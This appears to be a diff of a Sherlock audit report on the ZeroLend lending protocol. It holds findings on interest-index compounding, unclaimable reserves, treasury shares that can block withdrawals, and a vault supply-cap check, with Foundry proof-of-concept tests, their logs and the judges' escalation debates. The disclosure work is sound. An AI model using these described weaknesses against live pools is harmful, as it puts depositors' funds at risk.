-Run command `forge test --mt test_POC_InterestRateIndexCalc -vv` to see the following logs which show the more frequently the update, the more compounding-like the `liquidityIndex` becomes.
-
-```javascript
-Ran 3 tests for test/forge/core/pool/RandomCompoundingInterestPOC.t.sol:PoolSupplyRandomCompoundingEffect
-[PASS] test_POC_InterestRateIndexCalc_1_singleUpdate() (gas: 740335)
-Logs:
-  Updates once after a year: liquidityIndex 1.333e27
-  Updates once after a year: borrowIndex 1.446891914398940457716504e27
-
-[PASS] test_POC_InterestRateIndexCalc_2_monthlyUpdates() (gas: 1094439)
-Logs:
-  Updates monthly for a year: liquidityIndex 1.388987876426245531179679454e27
-  Updates monthly for a year: borrowIndex 1.447734004896004725108257228e27
-
-[PASS] test_POC_InterestRateIndexCalc_3_dailyUpdates() (gas: 65326938)
-Logs:
-  Updates every four hours for a year: liquidityIndex 1.395111981380752339971733874e27
-  Updates every four hours for a year: borrowIndex 1.447734611520782405003308237e27
-```
-
-
-```javascript
-// SPDX-License-Identifier: BUSL-1.1
-pragma solidity 0.8.19;
-
-import {console2} from 'forge-std/src/Test.sol';
-import {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';
-
-contract PoolSupplyRandomCompoundingEffect is PoolLiquidationTest {
-
-  function test_POC_InterestRateIndexCalc_1_singleUpdate() public {
-    _mintAndApprove(alice, tokenA, 10_000e18, address(pool)); // alice 10k tokenA
-    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
-
-    vm.startPrank(alice);
-    pool.supplySimple(address(tokenA), alice, 10_000e18, 0); // 10k tokenA alice supply
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
-    vm.stopPrank();
-
-    vm.startPrank(alice);
-    pool.borrowSimple(address(tokenB), alice, supplyAmountB, 0); // 750 tokenB borrow for 100% utilization
-    vm.stopPrank();
-
-    vm.warp(block.timestamp + 365 days);
-    
-    pool.forceUpdateReserves(); // updates indicies
-
-    console2.log('Updates once after a year: liquidityIndex %e', pool.getReserveData(address(tokenB)).liquidityIndex);
-    console2.log('Updates once after a year: borrowIndex %e', pool.getReserveData(address(tokenB)).borrowIndex);
-  }
-
-  function test_POC_InterestRateIndexCalc_2_monthlyUpdates() public {
-    _mintAndApprove(alice, tokenA, 10_000e18, address(pool)); // alice 10k tokenA
-    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
-
-    vm.startPrank(alice);
-    pool.supplySimple(address(tokenA), alice, 10_000e18, 0); // 10k tokenA alice supply
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
-    vm.stopPrank();
-
-    vm.startPrank(alice);
-    pool.borrowSimple(address(tokenB), alice, supplyAmountB, 0); // 750 tokenB borrow for 100% utilization
-    vm.stopPrank();
-
-    for(uint256 i = 0; i < 12; i++) {
-        vm.warp(block.timestamp + (30 * 24 * 60 * 60));
-        pool.forceUpdateReserves(); // updates indicies
-    }
-    vm.warp(block.timestamp + (5 * 24 * 60 * 60)); // Final 5 days
-    pool.forceUpdateReserves(); // updates indicies
-
-    console2.log('Updates monthly for a year: liquidityIndex %e', pool.getReserveData(address(tokenB)).liquidityIndex);
-    console2.log('Updates monthly for a year: borrowIndex %e', pool.getReserveData(address(tokenB)).borrowIndex);
-
-  }
-
-  function test_POC_InterestRateIndexCalc_3_dailyUpdates() public {
-    _mintAndApprove(alice, tokenA, 10_000e18, address(pool)); // alice 10k tokenA
-    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
-
-    vm.startPrank(alice);
-    pool.supplySimple(address(tokenA), alice, 10_000e18, 0); // 10k tokenA alice supply
-    vm.stopPrank();
-
-    vm.startPrank(bob);
-    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
-    vm.stopPrank();
-
-    vm.startPrank(alice);
-    pool.borrowSimple(address(tokenB), alice, supplyAmountB, 0); // 750 tokenB borrow for 100% utilization
-    vm.stopPrank();
-
-    for(uint256 i = 0; i < (6 * 365); i++) {
-        vm.warp(block.timestamp + (4 * 60 * 60));
-        pool.forceUpdateReserves(); // updates indicies
-    }
-
-    console2.log('Updates every four hours for a year: liquidityIndex %e', pool.getReserveData(address(tokenB)).liquidityIndex);
-    console2.log('Updates every four hours for a year: borrowIndex %e', pool.getReserveData(address(tokenB)).borrowIndex);
-  }
-}
-```
-
-### Mitigation
-
-- Track the principle and the interest separately. Accrue simple interest on the principle only.
-
-# Issue M-17: Unclaimable reserve assets will accrue in a pool due to the difference between interest paid on borrows and interest earned on supplies 
+# Issue M-10: Unclaimable reserve assets will accrue in a pool due to the difference between interest paid on borrows and interest earned on supplies 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429 
 
@@ -5463,12 +4946,208 @@ Another option would be to occasionally rebase `liquidityIndex` to increase the 
 
 In both cases it may be sensible to leave some dust as a buffer. 
 
-# Issue M-18: Supply interest is earned on `accruedToTreasuryShares` resulting in higher than expected treasury fees and under rare circumstances DOSed pool withdrawals 
+
+
+## Discussion
+
+**0xspearmint1**
+
+escalate
+
+This issue is invalid for multiple reasons
+
+1. The condition for this issue as stated by the watson is that `updateState()` must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call `updateState()`. In the POC they provided, it involves not calling `updateState()` for 365 days after borrowing funds.
+
+2. Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) requires the following:
+>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+
+No user experiences a loss in this issue  
+1. Lenders receive the correct interest rate  
+2. Borrowers pay the correct borrow rate
+
+**sherlock-admin3**
+
+> escalate
+> 
+> This issue is invalid for multiple reasons
+> 
+> 1. The condition for this issue as stated by the watson is that `updateState()` must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call `updateState()`. In the POC they provided, it involves not calling `updateState()` for 365 days after borrowing funds.
+> 
+> 2. Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) requires the following:
+> >Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+> 
+> No user experiences a loss in this issue  
+> 1. Lenders receive the correct interest rate  
+> 2. Borrowers pay the correct borrow rate
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**Nihavent**
+
+>"1. The condition for this issue as stated by the watson is that updateState() must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call updateState(). In the POC they provided, it involves not calling updateState() for 365 days after borrowing funds."
+
+The escalation comment misquoted the report saying "updateState() must NOT be called regularly" when the report states "updateState() must NOT be called every second". These are meaningfully different statements because the impact is present when updateState() is called as frequently as 2 seconds, which is more frequently than what would be expected in most pool/asset combinations.
+
+The elapsed time between `updateState()` calls is completely arbitrary and in the POC I used 365 days as a matter of habbit. See adjusted POC below where <u>instead of warping 365 days, we warp just 2 seconds and the test still passes</u>:
+
+```diff
+// SPDX-License-Identifier: BUSL-1.1
+pragma solidity 0.8.19;
+
+import {console2} from 'forge-std/src/Test.sol';
+import {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';
+
+contract AuditUnclaimableBalanceBuildupOnPool is PoolLiquidationTest {
+
+    ...
+
+-   vm.warp(block.timestamp + 365 days); // Time passes, interest accrues, treasury shares accrue
++   vm.warp(block.timestamp + 2 seconds); // Time passes, interest accrues, treasury shares accrue
+    pool.forceUpdateReserves();
+
+    ...
+  }
+
+}
+```
+
+```javascript
+Ran 1 test for test/forge/core/pool/UnclaimableBalanceBuildupOnPool.t.sol:AuditUnclaimableBalanceBuildupOnPool
+[PASS] test_POC_UnclaimableBalanceBuildupOnPool() (gas: 811472)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.18ms (1.08ms CPU time)
+```
+
+
+>"2. Sherlock's criteria for a medium issue requires the following:
+>
+>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+>
+>No user experiences a loss in this issue
+>
+>Lenders receive the correct interest rate
+>Borrowers pay the correct borrow rate"
+
+Funds locked in the contract must be considered lost because they are permanently unretrievable. 
+
+The amount locked (lets call it surpluss) increases every time debt is repaid. Over time it's reasonable to expect a signficiant portion of all a pool's assets will be surpluss and not claimable by anyone.
+
+The value of locked funds will clearly exceed 10 USD as there will usually be several percentage points difference between the indexes. This of course will vary depending on the frequency of `updateState()` calls. If this needs to be quantified I would be happy to help, but it clearly exceeds dust values.
+
+Finally, we can refer to the [Sherlock standards](https://github.com/sherlock-protocol/sherlock-v2-docs/blob/e7dc89270b05f8d2fcee69dc4204c7a2b8fb4cf9/audits/judging/judging/README.md?plain=1#L43-L47) to determine that permanent locked funds constitutes a valid issue:
+
+>"2. **Could Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue?** DoS has two separate scores on which it can become an issue:
+>   1. The issue causes locking of funds for users for more than a week.
+>   2. The issue impacts the availability of time-sensitive functions (cutoff functions are not considered time-sensitive).
+>If at least one of these are describing the case, the issue can be a Medium. If both apply, the issue can be considered of High severity. Additional constraints related to the issue may decrease its severity accordingly. \
+>Griefing for gas (frontrunning a transaction to fail, even if can be done perpetually) is considered a DoS of a single block, hence only if the function is clearly time-sensitive, it can be a Medium severity issue."
+
+
+**cvetanovv**
+
+For me, this issue is borderline Medium/Low. Because of this, we have to look at Sherlock's rules.
+
+These are the requirements for Medium severity:
+
+> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+
+The losses exceed 0.01% and 10 USD, and the issue meets the requirements for Medium severity.
+
+Planning to reject the escalation and leave the issue as is.
+
+**0xSpearmint**
+
+@cvetanovv Who exactly is experiencing the loss of funds here?
+
+The borrowers pay the expected borrow rate according to the interest rate contract.
+
+The lenders receive the expected supply rate according to the interest rate contract.
+
+The protocol receives the expected revenue from the reserve factor.
+
+AAVE does implement a [rescueTokens ](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/PoolLogic.sol#L75) function but it allows the owner to arbitrarily remove any amount of tokens from the pool, this is fine because AAVE governance is trusted. However, in ZeroLend pool deployment is permission-less, implementing such a function for each pool would pose a huge security risk which is why the protocol chose to not implement it. 
+
+This looks like an obvious design choice to me. 
+
+**DemoreXTess**
+
+@cvetanovv I agree with @0xSpearmint. This is actually not simply a design choice. Using compounding rate for borrowers and linear rate for suppliers are recommended way to build a lending protocol. In order to keep protocols health at higher point most of the lending protocol using this way. Those money is not lost, it's always in circulation for keeping liquidity in safe point. Repaying all the debt and getting all the pools' money is not rational movement in this PoC. There is no impact here as @0xSpearmint mentioned. 
+
+Secondly, I wonder @Nihavent did you solve all the problems in the protocl which is related with interest rate and accrued fund ?  Because identifying this problem with this PoC is really hard in current circumstances. We have 33 findings right now. I don't know how many of them related with those.
+
+**Nihavent**
+
+We all seem to agree that there will be unclaimable assets building up in the pool. These are the funds that are locked in the contract, and these funds are clearly lost. 
+
+>” This looks like an obvious design choice to me.”
+
+Given that the devs implemented ‘sweep()’ in NFTPositionManager which claims tokens of much lower value, not implementing similar functionality in the Pool contract is an obvious oversight and cannot be considered design. 
+
+Another piece of evidence that this is not a design choice is the [code comment](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L50)
+
+>”The approximation slightly underpays liquidity providers and undercharges borrowers”
+
+The comment indicates that due to using binomial approximation (3 terms) to calculate compounding interest, borrowers slightly underpay interest and suppliers receive slightly less interest. 
+This gives us a glimpse into the dev’s intentions that the supply interest earned should be much closer (potentially even equal to) to the debt interest paid (otherwise the precision lost due to this implementation does not matter). 
+The current implementation allows a buildup of unclaimable funds which far exceeds the precision lost in the code comment. 
+
+
+@0xSpearmint 
+### Who lost the funds?
+It would be up to the protocol to make a design decision as to who claims these funds. 
+If we take the code comment above it would appear that the suppliers are entitled to these funds (the suppliers must earn close to the interest repaid by borrowers for suppliers to feel the precision lost described in the code comment). 
+I did not take a definitive stand on this, I don’t believe it’s require for valid medium severity. 
+
+
+@DemoreXTess 
+>” Using compounding rate for borrowers and linear rate for suppliers are recommended way to build a lending protocol.”
+
+This is completely fine as long as there is a way to claim the delta between repaid debt interest and earned supply interest. If not this delta is locked in the contract. 
+
+
+>” Those money is not lost, it's always in circulation for keeping liquidity in safe point. Repaying all the debt and getting all the pools' money is not rational movement in this PoC.”
+
+Yes the unclaimable assets continue to be borrowed and repaid, which further increases the amount of unclaimable assets. Don’t be fooled by the fact that money is moving, a significant portion of it is unclaimable. 
+
+Repaying all debt and showing that the total claimable assets is less than the total pool’s assets was the simplest way to show this issue. This is a rational situation in Zerolend with permissionless pools, many pools will become inactive and liquidity may concentrate towards ‘high performing’ pools. In the current implementation all inactive pools will have latent funds locked permanently. 
+ 
+Even in active pools the unclaimable reserve is building up, which is why Aave fixed this problem with ‘rescueTokens’
+
+
+**cvetanovv**
+
+I agree with @Nihavent 
+
+We have a token loss that meets the Medium severity requirement.
+
+> The loss of the affected party must exceed 0.01% and 10 USD.
+
+These tokens remain permanently locked in the contract. AAVE has implemented a `rescueTokens` function, which fixes the problem. However, I agree that the recommendation here to implement the same function is not good and may open a new vulnerability because, in the ZeroLend pool, deployment is permissionless. The issue is valid, and the ZeroLend team is left to decide if and how they will fix the stuck tokens.
+
+My decision to reject the escalation remains.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429/#issuecomment-2394981478): rejected
+
+# Issue M-11: Supply interest is earned on `accruedToTreasuryShares` resulting in higher than expected treasury fees and under rare circumstances DOSed pool withdrawals 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430 
 
 ## Found by 
-0xAlix2, A2-security, Bigsam, Nihavent, Ocean\_Sky, thisvishalsingh
+0xAlix2, A2-security, Bigsam, Nihavent, Ocean\_Sky, trachev
 ### Summary
 
 Fees on debt interest are calculated in 'assets', but not claimed immediately and stored as shares. When they're claimed, they're treated as regular supplyShares and converted back to assets based on the `liquidityIndex` at the time they're claimed. This results in the realized fees being higher than expected, and under an extreme scenario may not leave enough liquidity for regular pool suppliers to withdraw their funds.
@@ -5657,12 +5336,592 @@ Three possible solutions:
 
 
 
-# Issue M-19: Curated Vault allocators cannot `reallocate()` a pool to zero due to attempting to withdraw 0 tokens from the underlying pool 
+**Honour-d-dev**
+
+Escalate
+
+This issue is invalid and is different from the #16 #220 #267 #317 group
+#240 is not in the above group
+
+`accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> This issue is invalid and is different from the #16 #220 #267 #317 group
+> #240 is not in the above group
+> 
+> `accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**Nihavent**
+
+> Escalate
+> 
+> This issue is invalid and is different from the #16 #220 #267 #317 group #240 is not in the above group
+> 
+> `accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.
+
+This report focuses on the edge case regarding frequent calls of `_updateIndexes()` however it still demonstrates a withdrawal DOSed due to insufficient liquidity (see impact 2 on the POC and associated comment):
+
+Excerpt from POC:
+
+```javascript
+    ... 
+
+    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. 
+    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.
+    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report
+    uint256 poolLiquidity = tokenB.balanceOf(address(pool));
+    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); 
+```
+
+If you have any doubt that this is due to the transfer of assets to treasury, you could add the following assert statement showing sufficient liquidity to withdraw if we remove the treasury asset transfer:
+
+```diff
+    ...
+
+    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. 
+    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.
+    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report
+    uint256 poolLiquidity = tokenB.balanceOf(address(pool));
+    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); 
++   assert(bobsAssets <= poolLiquidity);
+```
+
+<ins>This is exactly the same root cause as the family of issues you listed, thus they should remain grouped.</ins> 
+My understanding is in Sherlock duplication rules, valid duplicates do not need to identify the primary attack path.
+
+This report also discusses interest accruing on minted treasury shares results in more than the `reserveFactor` being claimed by the treasury (see impact 1 in the POC). As mentioned in the mitigations, this could be fixed by sending the fees in assets to the treasury upon debt repayment instead of minting the treasury shares which accrue over time. 
+If this change was implemented it would also mitigate the DOSed withdrawals because a withdrawal would not revert when the pool has just enough liquidity to service the withdrawn assets. 
+
+Finally, the point you make about AAVE accruing interest on treasury shares is not directly applicable to Zerolend because AAVE have removed `executeMintToTreasury()` from the pool withdraw flow [shown here](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/pool/Pool.sol#L196-L216) [and here](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L106-L163). 
+As a result, AAVEE need not worry about treasury fees being stored in shares because they won't DOS withdrawals.
+
+
+EDIT: for clarity I do conceed that impact 1 of this report by itself is low/info severity. But the fix for impact 1 also fixes DOSed withdrawals so it's closely related to impact 2 which is medium severity and matches the grouped family.
+
+**cvetanovv**
+
+I agree with @Nihavent comment that this issue can remain a duplicate with the others because it has caught the root cause, which the other issues have reported, and the second impact is the same as the other issues(withdrawal DoS).
+
+Also, from the escalation, I agree that #240 does not belong in this group but in the #101 group.
+
+Planning to reject the escalation of this issue(#430) to be invalid, but I'll duplicate #240 with #101.
+
+**0xSpearmint**
+
+@cvetanovv This issue is invalid.
+
+The root cause of this issue as described by the watsons is that `executeMintToTreasury ` will revert when a user attempts to withdraw all the liquidity from a pool.
+
+This is intended, consider the following scenario that assumes a 10% reserve factor:
+
+1. Lender lends 10 ETH
+2. Borrower borrows 10 ETH
+3. Later the borrower repays 5 ETH + 1 ETH interest (0.1ETH belongs to the treasury)
+4. Currently there is 6 ETH in the pool, If the lender attempts to withdraw 6 ETH it will revert **which is intended** because 0.1 ETH belongs to the treasury
+5. The lender can withdraw 5.9 ETH and have no issues
+
+While the 0.1 ETH is in the pool, it is not available liquidity for lenders to withdraw. It is reserved for the treasury
+
+**Nihavent**
+
+>”4. Currently there is 6 ETH in the pool, If the lender attempts to withdraw 6 ETH it will revert which is intended because 0.1 ETH belongs to the treasury”
+
+In this example the lender has supply shares equal in value to 10.9 ETH, why should a withdrawal of 6 ETH revert when the pool has 6 ETH of liquidity? 
+Yes the treasury holds supply shares equal to 0.1 ETH. These supplyShares are the same as any other supplyShares and should not need to be provisioned for in every single withdrawal. 
+
+What if treasuryShares are worth 2 ETH, a pool has 3 ETH of liquidity and a user who holds supplyShares worth 2 ETH attempts to withdraw 2 ETH. Why should this revert? 
+
+
+>”The root cause of this issue as described by the watsons is that executeMintToTreasury  will revert when a user attempts to withdraw all the liquidity from a pool.”
+
+Not necessarily, the example I just gave shows a user attempting to withdraw less than all the liquidity available and still facing a revert. 
+
+
+Note that Aave fixed this issue by removing ‘executeMintToTreasury’ from the withdrawal flow as I described [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430#issuecomment-2395198139)
+
+**0xjuaan**
+
+The pool has 6 ETH worth of liquidity, but 0.1 ETH is **reserved** for the treasury. Due to the **reserve** factor of 10%. Clearly these funds meant for the treasury should not be withdrawable by lenders.  
+
+**Nihavent**
+
+>” Clearly these funds meant for the treasury should not be withdrawable by lenders.”
+
+It is completely misleading to suggest that lenders are trying to withdraw treasury funds. They’re only trying to withdraw <ins>their funds</ins>. 
+
+The issue is clearly visible in pools with low liquidity and accumulating treasury fees such as this example:
+
+>” What if treasuryShares are worth 2 ETH, a pool has 3 ETH of liquidity and a user who holds supplyShares worth 2 ETH attempts to withdraw 2 ETH.”
+
+Where a withdrawal of any amount exceeding 1 ETH is DOSed until a repayment/deposit is made that covers the withdrawal amount and all treasury fees (which continue to accumulate). Note if the asset value of the treasury shares exceeds the available liquidity in the pool all withdrawals are DOSed. 
+
+It seems like you’re making the variable name ‘reserveFactor’ do too much work. If these funds were truly intended to be reserved, they would not be borrowable. 
+
+This issue was fixed in Aave for a reason, I’m yet to see a compelling argument why it’s not an issue in Zerolend 
+
+
+**cvetanovv**
+
+I believe this issue and its duplicates (excluding #240) are valid because the accumulation of treasury fees could ultimately result in a situation where all withdrawals from the pool are DOSed. 
+
+This occurs when the total accrued treasury fees exceed the available liquidity in the pool, thereby preventing suppliers from withdrawing their assets until the pool is replenished.
+
+As @Nihavent has pointed out,  Aave resolved this issue by excluding ‘executeMintToTreasury’ from the withdrawal flow.
+
+My previous decision to reject escalation remains. I will only invalidate #240
+
+**0xSpearmint**
+
+@cvetanovv The treasury fees is 10% of the interest paid on loans. This is orders of magnitude smaller than the principal liquidity of the pool. It is not realistic at all for the treasury fees to exceed the available liquidity in the pool unless the pool has > 99% utilization so there is barely anything left. This edge case will not last long at all since the borrower will have a huge interest rate to pay so the DOS will be well below 7 days and the lenders will receive huge yield for that period.
+
+Furthermore every time a single successful withdrawal occurs, the treasury fees reset to 0. This makes it even harder to accumulate an amount to cause a DOS.
+
+**Nihavent**
+
+>"It is not realistic at all for the treasury fees to exceed the available liquidity in the pool unless the pool has > 99% utilization so there is barely anything left. This edge case will not last long at all since the borrower will have a huge interest rate to pay so the DOS will be well below 7 days and the lenders will receive huge yield for that period."
+
+Your comment is making a lot of assumptions given high utilization is a completely valid pool state. There are a variety of IRMs and varying incentives for users.
+
+- There may be pools using `DefaultInterestRateStrategy` where the 'debtSlope' settings are not high enough. In these pools, the utilization has minimal impact on rates and users have little incentive to repay quickly.
+- Even if this isn't the case, higher utilization results in more interest repaid which results in more treasury fees which further increases the minimum deposit or repayment required to un-dos withdrawals. 
+- Not all IRMs increase rates as a function of utilization, we can see the codebase has plans for a `FixedInterestRateStrategy`. Your comment gives no consideration to extended DOS in pools with fixed rate stratergies. 
+
+>"Furthermore every time a single successful withdrawal occurs, the treasury fees reset to 0. This makes it even harder to accumulate an amount to cause a DOS."
+
+The issue is no withdrawal can occur when accumulated treasury shares exceed pool liquidity. 
+
+**cvetanovv**
+
+I agree with @Nihavent comment, and my previous decision remains: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430#issuecomment-2435074872
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430/#issuecomment-2392041769): rejected
+
+# Issue M-12: `CuratedVaultSetters::_supplyPool()` does not consider the pool cap of the underlying pool, which may cause `deposit()` to revert or lead to an unintended reordering of `supplyQueue` 
+
+Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433 
+
+## Found by 
+Bigsam, Nihavent, wellbyt3
+### Summary
+
+The curated vault's `_supplyPool()` function deposits assets into the underlying pools in `supplyQueue`. Whilst it considers the curated vault's cap for a given pool, it does not consider the underlying pool's internal cap. As a result, some `CuratedVault::deposit()` transactions will revert due to running out of pools to deposit to, or the liquidity will be allocated to the `supplyQueue` in a different order. 
+
+### Root Cause
+
+`CuratedVaultSetters::_supplyPool()` is [called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L38) in the deposit flow of the curated vault. As shown below, it attempts to deposit the minimum of `assets` and `supplyCap - supplyAssets` (which is the 'available curated pool cap' for this pool). 
+
+```javascript
+  function _supplyPool(uint256 assets) internal {
+    for (uint256 i; i < supplyQueue.length; ++i) {
+      IPool pool = supplyQueue[i];
+
+      uint256 supplyCap = config[pool].cap;
+      if (supplyCap == 0) continue;
+
+      pool.forceUpdateReserve(asset());
+
+      uint256 supplyShares = pool.supplyShares(asset(), positionId);
+
+      // `supplyAssets` needs to be rounded up for `toSupply` to be rounded down.
+      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = pool.marketBalances(asset());
+@>    uint256 supplyAssets = supplyShares.toAssetsUp(totalSupplyAssets, totalSupplyShares);
+
+@>    uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);
+
+      if (toSupply > 0) {
+        // Using try/catch to skip markets that revert.
+        try pool.supplySimple(asset(), address(this), toSupply, 0) {
+          assets -= toSupply;
+        } catch {}
+      }
+
+      if (assets == 0) return;
+    }
+
+    if (assets != 0) revert CuratedErrorsLib.AllCapsReached();
+  }
+```
+
+However, the function does not consider an underlying pool's `supplyCap`. Underlying pools have their own `supplyCap` which will cause `supply()` calls to revert if they would put the pool over it's `supplyCap`:
+
+```javascript
+  function validateSupply(
+    DataTypes.ReserveCache memory cache,
+    DataTypes.ReserveData storage reserve,
+    DataTypes.ExecuteSupplyParams memory params,
+    DataTypes.ReserveSupplies storage totalSupplies
+  ) internal view {
+    ... SKIP!...
+
+    uint256 supplyCap = cache.reserveConfiguration.getSupplyCap();
+
+    require(
+      supplyCap == 0
+@>      || ((totalSupplies.supplyShares + uint256(reserve.accruedToTreasuryShares)).rayMul(cache.nextLiquidityIndex) + params.amount)
+          <= supplyCap * (10 ** cache.reserveConfiguration.getDecimals()),
+      PoolErrorsLib.SUPPLY_CAP_EXCEEDED
+    );
+  }
+```
+
+Also note that the `pool::supplySimple()` call in `_supplyPool()` is wrapped in a [try/catch block](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L134-L136), so if a `pool::supplySimple()` call were to revert, it will just continue to the next pool.
+
+### Internal pre-conditions
+
+- A `CuratedVault::deposit()` call needs to be within the limits of the curated vault's cap (`config[pool].cap`) but exceed the limits of the underlying pool's `supplyCap`.
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+1. A curated pool has two pools in the `supplyQueue`.
+2. The first underlying pool has an internal `supplyCap` of 100e18 and is currently at 99e18.
+3. The first underlying pool has an internal `supplyCap` of 100e18 and is currently at 99e18.
+4. A user calls `deposit()` on the curated vault with a value of 2e18.
+5. The value does not exceed the curated vault's `config[pool].cap` for either pool.
+6. The underlying call to `Pool::supplySimple()` will silently revert on both pools, and the entire transaction will revert due to [running out of available pools to supply the assets to](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L142)
+7. As a result, no assets are deposits, despite the underlying pools having capacity to accept the 2e18 deposit between them.
+
+### Impact
+
+**Deposit Reverts**
+- If a deposit would be able to be deposited across two or more underlying pools in the `supplyQueue`, but is too large to be added to any one of these underlying pools, the deposit will completely revert, despite the underlying pools having capacity to accept the deposit.
+
+**Inefficient reorder of `supplyQueue`**
+- If a deposit amount is within the limits of the curated pool's `config[pool].cap`, but would exceed the limits an underlying pool in `supplyQueue`. Then the silent revert would skip this pool and attempt to deposit it's liquidity to the next pool in the queue. This is an undesired/inefficient reordering of the `supplyQueue` as a simple check on the cap of the underlying pool would reveal some amount that would be accepted by the underlying pool.
+
+### PoC
+
+_No response_
+
+### Mitigation
+
+Create an external getter for a pool's supply cap, similar to `ReserveConfiguration::getSupplyCap()` the next function should also scale the supply cap by the reserve token's decimals. 
+
+Then, add an extra check in `CuratedVaultSetters::_supplyPool()` as shown below.
+
+
+```diff
+  function _supplyPool(uint256 assets) internal {
+    for (uint256 i; i < supplyQueue.length; ++i) {
+      IPool pool = supplyQueue[i];
+
+      uint256 supplyCap = config[pool].cap;
+      if (supplyCap == 0) continue;
+
+      pool.forceUpdateReserve(asset());
+
+      uint256 supplyShares = pool.supplyShares(asset(), positionId);
+
+      // `supplyAssets` needs to be rounded up for `toSupply` to be rounded down.
+      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = pool.marketBalances(asset());
+      uint256 supplyAssets = supplyShares.toAssetsUp(totalSupplyAssets, totalSupplyShares);
+
+      uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);
+
++     toSupply = UtilsLib.min(toSupply, pool.getSupplyCap(pool.getConfiguration(asset())) - totalSupplyAssets );
+
+      if (toSupply > 0) {
+        // Using try/catch to skip markets that revert.
+        try pool.supplySimple(asset(), address(this), toSupply, 0) {
+          assets -= toSupply;
+        } catch {}
+      }
+
+      if (assets == 0) return;
+    }
+
+    if (assets != 0) revert CuratedErrorsLib.AllCapsReached();
+  }
+```
+
+
+
+
+## Discussion
+
+**sherlock-admin3**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**Honour** commented:
+>  Invalid: see comment on #193
+
+
+
+**Nihavent**
+
+Escalate
+
